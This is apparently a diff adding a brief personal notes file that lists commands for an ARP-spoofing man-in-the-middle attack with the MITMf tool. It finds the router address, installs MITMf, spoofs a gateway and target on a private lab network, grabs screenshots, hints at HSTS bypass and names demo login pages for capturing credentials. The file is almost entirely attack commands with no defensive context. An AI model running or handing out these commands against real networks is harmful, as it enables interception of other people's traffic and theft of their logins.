@@ -1,0 +1,14 @@
+arp -a //router's ip
+
+//install mitmf
+apt-get update
+apt-get install mitmf -y
+
+//attack
+mitmf --arp --spoof --gateway 10.0.2.1  --targets 10.0.2.15 -i eth0 
+mitmf --arp --spoof --gateway 10.0.2.1  --targets 10.0.2.15 -i eth0 --screen
+//-hsts
+
+//Website
+http://www.stealmylogin.com/demo.html
+http://w3schools.invisionzone.com/
